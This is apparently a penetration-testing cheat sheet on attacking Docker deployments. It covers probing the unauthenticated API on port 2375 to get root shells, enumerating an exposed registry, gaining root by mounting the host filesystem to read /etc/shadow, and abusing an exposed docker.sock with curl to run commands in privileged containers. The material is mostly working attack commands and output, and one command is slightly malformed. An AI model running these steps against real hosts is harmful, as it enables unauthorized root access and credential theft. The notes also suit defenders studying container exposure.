---
title: "Docker"
description: "Docker commands"
date: 22/09/2020
categories:
 - misc
tags:
 - docker
 - API
---


## Docker API

The docker API expose the port `2375`. This API can be used to interact with the docker engine which basically give ou the right to do anything you desire unauthenticated.

To confirm that the host is running Docker you can make a GET requests to `/version` :

```http
http://<host>:<port>/version

{"Platform": {"Name": ""}, "Components": [{"Name": "Engine", "Version": "18.06.1-ce", "Details": {"ApiVersion": "1.38", "Arch": "amd64", "BuildTime": "2018-10-26T23:39:57.000000000+00:00", "Experimental": "false", "GitCommit": "e68fc7a/18.06.1-ce", "GoVersion": "go1.10.3", "KernelVersion": "4.14.47-64.38.amzn2.x86_64", "MinAPIVersion": "1.12", "Os": "linux"}}], "Version": "18.06.1-ce", "ApiVersion": "1.38", "MinAPIVersion": "1.12", "GitCommit": "e68fc7a/18.06.1-ce", "GoVersion": "go1.10.3", "Os": "linux", "Arch": "amd64", "KernelVersion": "4.14.47-64.38.amzn2.x86_64", "BuildTime": "2018-10-26T23:39:57.000000000+00:00"}
```

Then, using the CLI you can execute commands, for instance:
```bash
$ docker -H <host>:<port> ps

CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS               NAMES
be2dd8aa8222        ubuntu:14.04        "bash"              5 years ago         Up 2 seconds                            silly_elion

$ docker -H <host>:<port> exec -it <container_name> /bin/bash
root@abc:/# whoami
root
```


## Registry server

The registry server is deployed on port `5000`. Go to `/v2/_catalog` on your browser to
check if this is a registry server.

```http
http://<host>:5000/v2/_catalog
```

The server responds with the list of repositories:

```json
{"repositories":["repostitory-1"]}
```

You can configure your docker client to connect to this server.

```bash
sudo docker login <host>:5000
```

If there is a custom certificate, then add an exception in `/etc/docker/daemon.json` with:

```json
{
    "insecure-registries":[ "<host>:5000"]
}
```


## Privilege Escalation

If the current user belong to the `docker` group then he can start a container
with a binding to files own by root and read them:

```bash
docker run --it --rm -v /:/mnt alpine:latest /mnt sh
```

Inside the container shell he can read all the files as root:

```bash
cat /etc/shadow
```


## Save image to tar file

```bash
docker save -o output.tar public.ecr.aws/xxx/yyy
```

## Exploit docker.sock with curl

From [https://dejandayoff.com/the-danger-of-exposing-docker.sock/](https://dejandayoff.com/the-danger-of-exposing-docker.sock/
):

```bash
root@1nmyd0ck3r:~# ls -al /var/run/docker.sock
srw-rw---- 1 root 998 0 May 29 15:07 /var/run/docker.sock

root@1nmyd0ck3r:~# curl --unix-socket /var/run/docker.sock http://127.0.0.1/containers/json
[
    {
        "Id": "9a79cbdfbc4d48982f1a427909bb6...",
        # ...
    },
    {
        "Id": "76b79677e3cc5db8764df08d75474...",
        # ...
    }
]

root@1nmyd0ck3r:~# curl -X POST -H "Content-Type: application/json" --data-binary '{"AttachStdin": true,"AttachStdout": true,"AttachStderr": true,"Cmd": ["cat", "/etc/passwd"],"DetachKeys": "ctrl-p,ctrl-q","Privileged": true,"Tty": true}' --unix-socket /var/run/docker.sock http://127.0.0.1/containers/9a79cbdfbc4d48982f1a427909bb6.../exec
{"Id":"1bb5e42858b7f684152a66e8ac54ced5c80aa0c50d1eb5a482341076d61ee256"}

root@1nmyd0ck3r:~# curl --output - -X POST -H 'Content-Type: application/json' --data-binary '{"Detach": false,"Tty": false}' --unix-socket /var/run/docker.sock http://127.0.0.1/exec/1bb5e42858b7f684152a66e8ac54ced5c80aa0c50d1eb5a482341076d61ee256/start
```
